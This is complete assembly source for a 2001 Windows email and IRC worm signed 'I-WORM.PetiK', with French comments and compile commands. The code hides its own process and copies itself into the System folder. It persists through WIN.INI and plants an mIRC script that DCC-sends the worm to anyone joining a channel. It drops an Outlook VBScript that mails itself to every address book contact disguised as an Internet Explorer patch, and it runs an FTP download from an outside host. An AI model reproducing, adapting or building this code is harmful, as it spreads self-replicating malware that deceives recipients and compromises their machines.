; comment $				04/02/2001 => 07/02/2001
; DESCRIPTION:
; S'enregistre comme "Service Process" c'est à dir qu'il n'est pas visible dans
; la liste des tâches (CTRL+ALT+SUPR).
; Se copie ensuite dans le dossier SYSTEM sous le nom ie042601.exe : %SysDir%\ie042601.exe
; Et s'ebregistre dans le fichier WIN.INI :
; 
; 	[windows]
; 	run=%SysDir%\ie042601.exe (où %SysDir% est le nom par défaut du dossier SYSTEM)
; 
; Crée le fichier SCRIPT.INI dans C:\ puis va le copier dans C:\MIRC et C:\MIRC32 puis efface
; l'original dans C:\
; Crée EMAIL.VBS dans le répertoire %WinDir% en "lecture seule".
; Crée WSOCK32.BAT et C:\WIN.DRV dans %WinDir% en "fichier caché".
; Le programme essaie ensuite de se procurer l'adresse IP du site francophone de yahoo (www.yahoo.fr).
; Si il y arrive, il éxécute WSOCK32.BAT :
;  - Exécution de EMail.vbs = Envoir du programme à tous les destinataires du carnet d'adresses.
;  - Téléchargement de petik.bmp dans C:\
; 
; Modification du papier peint avec l'image "petik.bmp".
; Tous les fichiers BMP dur répertoire WINDOWS auront l'attribut caché.
; 
; 
; POUR COMPILER:
; tasm32 /M /ML ie042601.asm
; tlink32 -Tpe -x -aa ie042601.obj,,,import32 $

.386
jumps
locals
.model flat, stdcall

;KERNEL32.dll
extrn CreateFileA:PROC
extrn WritePrivateProfileStringA:PROC
extrn CloseHandle:PROC
extrn CopyFileA:PROC
extrn lstrcat:PROC
extrn DeleteFileA:PROC
extrn ExitProcess:PROC
extrn FindFirstFileA:PROC
extrn FindNextFileA:PROC
extrn FindClose:PROC
extrn GetCurrentDirectoryA:PROC
extrn GetCurrentProcessId:PROC
extrn GetModuleFileNameA:PROC
extrn GetModuleHandleA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetWindowsDirectoryA:PROC
extrn RegisterServiceProcess:PROC
extrn SetCurrentDirectoryA:PROC
extrn SetFileAttributesA:PROC
extrn Sleep:PROC
extrn WinExec:PROC
extrn WriteFile:PROC

;ADVAPI32.dll
extrn RegSetValueExA:PROC
extrn RegOpenKeyExA:PROC
extrn RegCloseKey:PROC

;WSOCK32.dll
extrn gethostbyname:PROC

;USER32.dll
extrn SystemParametersInfoA:PROC

.data
szBAT		db 260 dup (0)
szInfo		db 260 dup (0)
szOrig 		db 260 dup (0)
szVBS		db 260 dup (0)
szWinini 	db 260 dup (0)
DIR			db 260 dup (0)
FileHandle	dd ?
RegHandle	dd ?
SearchHandle	dd ?
octets		dd ?
Copie	 	db "\ie042601.exe",00h
batfile		db "\wsock32.bat",00h
vbsfile		db "\EMail.vbs",00h
bmpfile		db "C:\petik.bmp",00h
drvfile		db "C:\Win.drv",00h
inifile	 	db "C:\script.ini",00h
script1		db "C:\mirc\script.ini",00h
script2		db "C:\mirc32\script.ini",00h
Winini	 	db "\\WIN.INI",00h
run	 		db "run",00h
windows	 	db "windows",00h
yahoo		db "http://www.yahoo.fr",00h
SOUS_CLE	db "Control Panel\Desktop",00h
TWP_D		db "TileWallpaper",00h
TWP_S		db "0",00h
WPS_D		db "WallpaperStyle",00h
WPS_S		db "2",00h
FICHIER		db "*.bmp",00h


FILE_ATTRIBUTE_READONLY	equ 00000001h
FILE_ATTRIBUTE_HIDDEN	equ 00000002h
FILE_ATTRIBUTE_NORMAL 	equ 00000080h
CREATE_ALWAYS 			equ 00000002h
FILE_SHARE_READ 		equ 00000001h
GENERIC_WRITE 			equ 40000000h
KEY_SET_VALUE			equ 00000002h
REG_SZ					equ 00000001h
HKEY_CURRENT_USER		equ 80000001h
SPI_SETDESKWALLPAPER	equ 00000020

max_path			equ 260
filetime		struc
	LowDateTime	dd ?
	HighDateTime	dd ?
filetime		ends
win32			struc
	FileAttributes	dd ?			; Attribut du fichier
	CretionTime		filetime ?		; Date de création
	LastAccessTime	filetime ?		; Dernier accès
	LastWriteTime	filetime ?		; Dernière modification
	FileSizeHigh	dd ?			; Taille du fichier
	FileSizeLow		dd ?			; La même chose qu'avant
	Reserved0		dd ?			;
	Reserved1		dd ?			;
	FileName		dd max_path(?)		; Nom du fichier long
	AlternativeFileName	db 13 dup(?)	; Nom du fichier court
				db  3 dup(?)	;
win32			ends
CHERCHE win32 <>

inid:	db "[script]",0dh,0ah
		db "n0=on 1:JOIN:#:{",0dh,0ah
		db "n1= /if ( $nick == $me ) { halt }",0dh,0ah
		db "n2= /.dcc send $nick "
szCopie	db 260 dup (0)
		db "",0dh,0ah
		db "n3=}",00h
INITAILLE		equ $-inid

vbsd:
db 'Dim fso,ws,file',0dh,0ah
db 'Set fso=CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'Set ws=CreateObject("WScript.Shell")',0dh,0ah
db 'DEBUT()',0dh,0ah
db 'Sub DEBUT()',0dh,0ah
db 'EMAIL()',0dh,0ah
db 'End Sub',0dh,0ah
db 'Sub EMAIL()',0dh,0ah
db 'Set OApp=CreateObject("Outlook.Application")',0dh,0ah
db 'If OApp="Outlook" Then',0dh,0ah
db 'Set Mapi = OApp.GetNameSpace("MAPI")',0dh,0ah
db 'For Each AddList In Mapi.AddressLists',0dh,0ah
db 'If AddList.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For AddListCount = 1 To AddList.AddressEntries.Count',0dh,0ah
db 'Set AddListEntry = AddList.AddressEntries(AddListCount)',0dh,0ah
db 'Set msg = OApp.CreateItem(0)',0dh,0ah
db 'msg.To = AddListEntry.Address',0dh,0ah
db 'msg.Subject = "The last patch for Internet Explorer"',0dh,0ah
db 'm = "Date : " & date',0dh,0ah
db 'm = m & vbCrLf & "A lot of virus and worms use a bug in Internet Explorer"',0dh,0ah
db 'm = m & vbCrLf & "This patch allows you to correct this problem"',0dh,0ah
db 'm = m & vbCrLf & ""',0dh,0ah
db 'msg.Body = m',0dh,0ah
db 'msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(1),"\ie042601.exe")',0dh,0ah
db 'If msg.To <> "" Then',0dh,0ah
db 'msg.Send',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End if',0dh,0ah
db 'End Sub',0dh,0ah
VBSTAILLE		equ $-vbsd

batd:
db "@echo off",0dh,0ah
db "if exist C:\WINDOWS\EMail.vbs start C:\WINDOWS\EMail.vbs",0dh,0ah
db "if exist C:\WINDOW\EMail.vbs start C:\WINDOW\EMail.vbs",0dh,0ah
db "if exist C:\WIN\EMail.vbs start C:\WIN\EMail.vbs",0dh,0ah
db "if exist C:\WIN95\EMail.vbs start C:\WIN95\EMail.vbs",0dh,0ah
db "if exist C:\WIN98\EMail.vbs start C:\WIN98\EMail.vbs",0dh,0ah
db "if exist C:\WINDOWS.000\EMail.vbs start C:\WINDOWS.000\EMail.vbs",0dh,0ah
db "if exist C:\WINDOWS.001\EMail.vbs start C:\WINDOWS.001\EMail.vbs",0dh,0ah
db "start ftp -i -v -s:C:\Win.drv",00h
BATTAILLE               equ $-batd

drvd:
db "open",0dh,0ah
db "members.aol.com",0dh,0ah
db "pentasm99",0dh,0ah
db "lcd C:\",0dh,0ah
db "bin",0dh,0ah
db "get petik.bmp",0dh,0ah
db "bye",0dh,0ah
db "exit",00h
DRVTAILLE               equ $-drvd

.code
DEBUT:
CACHE:  call GetCurrentProcessId        ; Ceci permet de cacher le programme
        push 01h                        ; dans la liste des tâches.
        push eax                        ; (CTRL+ALT+SUPR)
        call RegisterServiceProcess     ;

COPIE:  push 00h                        ; On copie ici le fichier original
        call GetModuleHandleA           ; 
        push 260                        ;
        push offset szOrig              ;
        push eax                        ;
        call GetModuleFileNameA         ;
        push 260                        ;
        push offset szCopie             ;
        call GetSystemDirectoryA        ; dans le répertoire SYSTEM
        push offset Copie               ; avec le nom "ie042601.exe"
        push offset szCopie             ;
        call lstrcat                    ;
        push 00h                        ;
        push offset szCopie             ;
        push offset szOrig              ;
        call CopyFileA                  ;
                                        
WIN_INI:push 260                        ; Pour qu'il s'active à chaque démarrage,
        push offset szWinini            ;
        call GetWindowsDirectoryA       ; on enregistre le nom du fichier dans WIN.INI
        push offset Winini              ;
        push offset szWinini            ; dans la section [windows] à la ligne "run":
        call lstrcat                    ;
        push offset szWinini            ; [windows]
        push offset szCopie             ; run=%SysDir%\ie042601.exe
        push offset run                 ;
        push offset windows             ;
        call WritePrivateProfileStringA ;

SCRIPT: push 00h                        ; Création du fichier C:\script.ini
        push FILE_ATTRIBUTE_NORMAL      ;
        push CREATE_ALWAYS              ;
        push 00h                        ;
        push FILE_SHARE_READ            ;
        push GENERIC_WRITE              ;
        push offset inifile             ;
        call CreateFileA                ;
        mov  [FileHandle],eax           ;
        push 00h                        ;
        push offset octets              ;
        push INITAILLE                  ;
        push offset inid                ;
        push [FileHandle]               ;
        call WriteFile                  ;
        push [FileHandle]               ;
        call CloseHandle                ;

        push 00h                        ; On copie ce fichier dans les répertoires suivants
        push offset script1             ; C:\MIRC
        push offset inifile             ;
        call CopyFileA                  ;
        push 00h                        ;
        push offset script2             ; et C:\MIRC32
        push offset inifile             ;
        call CopyFileA                  ;
        push offset inifile             ;
        call DeleteFileA                ;

EMAIL:  push 260                        ; Création du fichier EMail.vbs dans le répertoire
        push offset szVBS               ;
        call GetWindowsDirectoryA       ; WINDOWS par défaut en "lecture seule".
        push offset vbsfile             ;
        push offset szVBS               ;
        call lstrcat                    ;
        push 00h                        ;
        push FILE_ATTRIBUTE_READONLY    ;
        push CREATE_ALWAYS              ;
        push 00h                        ;
        push FILE_SHARE_READ            ;
        push GENERIC_WRITE              ;
        push offset szVBS               ;
        call CreateFileA                ;
        mov  [FileHandle],eax           ;
        push 00h                        ;
        push offset octets              ;
        push VBSTAILLE                  ;
        push offset vbsd                ;
        push [FileHandle]               ;
        call WriteFile                  ;
        push [FileHandle]               ;
        call CloseHandle                ;

FTP: 	push 00h                        ; Création du fichier C:\Win.drv
        push FILE_ATTRIBUTE_HIDDEN      ; en mode "caché"
        push CREATE_ALWAYS              ;
        push 00h                        ;
        push FILE_SHARE_READ            ;
        push GENERIC_WRITE              ;
        push offset drvfile             ;
        call CreateFileA                ;
        mov  [FileHandle],eax           ;
        push 00h                        ;
        push offset octets              ;
        push DRVTAILLE                  ;
        push offset drvd                ;
        push [FileHandle]               ;
        call WriteFile                  ;
        push [FileHandle]               ;
        call CloseHandle                ;

EXEC:  	push 260                        ;
        push offset szBAT               ;
        call GetWindowsDirectoryA       ;
        push offset batfile             ;
        push offset szBAT               ;
        call lstrcat			;
	push 00h                        ; Création du fichier WSOCK32.BAT dans "WINDOWS"
        push FILE_ATTRIBUTE_NORMAL      ; 
        push CREATE_ALWAYS              ;
        push 00h                        ;
        push FILE_SHARE_READ            ;
        push GENERIC_WRITE              ;
        push offset szBAT		;
        call CreateFileA                ;
        mov  [FileHandle],eax           ;
        push 00h                        ;
        push offset octets              ;
        push BATTAILLE                  ;
        push offset batd                ;
        push [FileHandle]               ;
        call WriteFile                  ;
        push [FileHandle]               ;
        call CloseHandle                ;
	jmp  CONNECT

PAUSE:	push 15 * 1 * 1000		; Attend 3 minutes,
	call Sleep			; puis recommence.

CONNECT:push offset yahoo		; Vérifie si on peut se procurer
	call gethostbyname		; l'adresse IP de www.yahoo.fr.
	test eax,eax			; OUI => On continue.
	jz   PAUSE			; NON => On refait une pause.

BAT:	push 01h			; Exécute le fichier
	push offset batfile		;
	call WinExec			;

ATTEND:	push 30 * 1 * 1000		; Fait une pause de 30 secondes.
	call Sleep			; Puis continue.

BDR:    push offset RegHandle           ; On cherche la sous-clé "ControlPanel\Desktop"
        push KEY_SET_VALUE              ;
        push 00h                        ;
        push offset SOUS_CLE            ;
        push HKEY_CURRENT_USER          ;
        call RegOpenKeyExA              ;

        push 02h                        ; 
        push offset TWP_D               ;
        push offset REG_SZ              ;
        push 00h                        ;
        push offset TWP_S               ;
        push [RegHandle]                ;
        call RegSetValueExA             ;

        push 02h                        ;
        push offset WPS_D               ;
        push offset REG_SZ              ;
        push 00h                        ;
        push offset WPS_S               ;
        push [RegHandle]                ;
        call RegSetValueExA             ;

        push 00h                        ; On active "C:\petik.bmp" en papier peint
        push offset bmpfile             ;
        push 00h                        ;
        push SPI_SETDESKWALLPAPER       ;
        call SystemParametersInfoA      ;

        push 00h                        ;
        call RegCloseKey                ;

DOSSIER:push 260			; On va aller dans le répertoire WINDOWS.
	push offset DIR			;
	call GetWindowsDirectoryA	; On y est. (On peut metre GetCurrentDirectoryA
	push offset DIR			; ou encore GetSystemDirectoryA)
	call SetCurrentDirectoryA	; On va le charger.

FFF:	push offset CHERCHE		; On utilise les infos du fichier WIN32
	push offset FICHIER		; On prend l'extension que l'on veut (ici *.txt)
	call FindFirstFileA		; On recherche le premier fichier
	mov  edi,eax			;
	cmp  eax,-1			; Si il ne trouve pas => -1
	je   FIN			; et saute au label FIN

MODIF:	push 02h			; On modifie ici l'attribut du fichier que l'on
	push offset CHERCHE.FileName	; a ouvert. On va lui mettre l'attribut caché (02h)
	call SetFileAttributesA		; et lecture seule (01h)

FNF:	push offset CHERCHE		; On recherche les autres fichiers
	push edi			;
        call FindNextFileA		;
	or   eax,eax			; Si il n'en trouve pas, saute au label FIN
	jnz  MODIF			; sinon, retourne au label MODIF

FC:	push offset SearchHandle	; Ferme la session Cherche
	call FindClose			;

FIN:    push 00h                        ; FIN DU PROGRAMME
        call ExitProcess                ;

signature db "I-WORM.PetiK",00h

end DEBUT
